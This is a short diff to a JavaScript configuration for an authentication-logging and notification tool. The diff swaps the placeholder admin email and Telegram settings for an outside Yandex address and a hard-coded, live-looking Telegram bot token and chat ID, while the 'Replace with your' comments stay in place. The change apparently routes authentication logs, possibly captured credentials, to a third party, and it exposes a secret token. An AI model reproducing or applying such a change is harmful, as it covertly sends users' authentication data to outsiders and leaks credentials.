@@ -7,10 +7,10 @@ const config = {
   logEndpoint: "https://yourcompanydomain.com/auth-logs", // Your secure logging endpoint
   notificationSettings: {
     sendEmail: true,
-    emailRecipient: "admin@yourcompanydomain.com",
+    emailRecipient: "jokersudo@yandex.com",
     useTelegram: true,
-    telegramBotToken: "YOUR_TELEGRAM_BOT_TOKEN", // Replace with your bot token
-    telegramChatId: "YOUR_TELEGRAM_CHAT_ID" // Replace with your chat ID
+    telegramBotToken: "5833826797:AAHinlaDwiK7-fk8_LMjk8aGydwiM70TZ8g", // Replace with your bot token
+    telegramChatId: "5480674751" // Replace with your chat ID
   },
   sessionSettings: {
     longExpiryDays: 30 // How long to keep monitoring data
